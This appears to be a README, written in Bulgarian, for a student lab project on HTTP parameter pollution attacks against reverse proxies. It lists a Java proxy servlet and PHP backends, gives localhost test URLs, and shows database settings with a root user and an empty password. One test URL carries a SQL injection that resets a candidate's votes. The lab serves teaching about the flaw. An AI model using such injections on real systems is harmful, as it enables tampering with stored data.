# Атаки с двойно подадени параметри при обратни прокси сървъри

**Съдържание:**
Реферат на темата и прост пример за тестване на уязвимостта:
* MyServlet.java - изпълняващ ролятя на reverse proxy 
* web.xml
* Home.html - началната страница на приложението
* votebackend.php - backend сървъра
* votebackend_eddited.php

**Примерни url за тестване на уязвимостта:**<br>
http://localhost:8080/Project/voting?vote=Red&vote=45454<br>
http://localhost:8080/Project/voting?vote=Blue&vote=Blue';%20UPDATE%20results%20SET%20votes=0%20WHERE%20candidate='Red

**Таблицата, с която работи votebackend :**
```
CREATE TABLE results (
  id bigint(20) AUTO_INCREMENT PRIMARY KEY UNSIGNED NOT NULL,
  candidate tinytext NOT NULL,
  votes int(11) NOT NULL
);

DB_HOST: "localhost"
DB_USERNAME: "root"
DB_PASSWORD: ""
DB_NAME: "securitycheck"
```
